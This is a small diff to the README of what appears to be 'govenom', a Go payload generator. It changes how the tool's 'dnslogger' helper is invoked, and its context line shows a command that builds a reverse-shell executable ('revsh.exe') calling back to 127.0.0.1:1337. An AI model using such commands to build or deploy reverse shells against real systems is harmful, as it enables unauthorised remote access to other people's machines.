@@ -116,7 +116,7 @@ govenom payload xrsh -d 127.0.0.1:1337 \
     -o revsh.exe
 
 # run a tool
-govenom ./govenom.go tool dnslogger
+govenom tool dnslogger
 ```
 
 **Note:** Go has to be installed to run `govenom` itself and it is
